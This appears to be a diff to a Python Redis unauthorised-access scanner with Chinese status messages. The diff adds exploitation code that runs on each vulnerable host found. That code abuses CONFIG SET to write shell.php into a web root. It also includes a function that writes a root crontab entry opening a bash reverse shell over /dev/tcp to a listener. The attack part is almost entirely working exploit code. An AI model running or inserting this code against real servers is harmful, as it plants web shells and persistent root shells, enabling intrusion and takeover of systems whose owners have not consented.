@@ -38,11 +38,30 @@ def check_redis_connect(ip):
         if info:
             print(f"[+] {ip}  存在未授权访问")
             print(f"[+] {r.client_list()}")
+            exp_webShell(r)
         else:
             print(f"[-] {ip} 不存在未授权访问")
     except redis.ConnectionError:
         print(f"[-] 无法连接到 {ip}:6379")
         return
+
+
+def exp_webShell(redis_client):
+    root = 'D:/phpstudy_pro/WWW'
+    redis_client.config_set('dir', root)
+    redis_client.config_set('dbfilename', 'shell.php')
+    redis_client.set('x', '<?php phpinfo(); ?>')
+    redis_client.save()
+    print(f"[+] webshell 写入成功")
+
+
+def exp_crontab(redis_client):
+    root = '/var/spool/cron'
+    redis_client.config_set('dir', root)
+    redis_client.config_set('dbfilename', 'root')
+    redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/127.0.0.1/8888 0>&1\n\n')
+    redis_client.save()
+    print(f"[+] 定时任务已创建")
 
 
 if __name__ == '__main__':
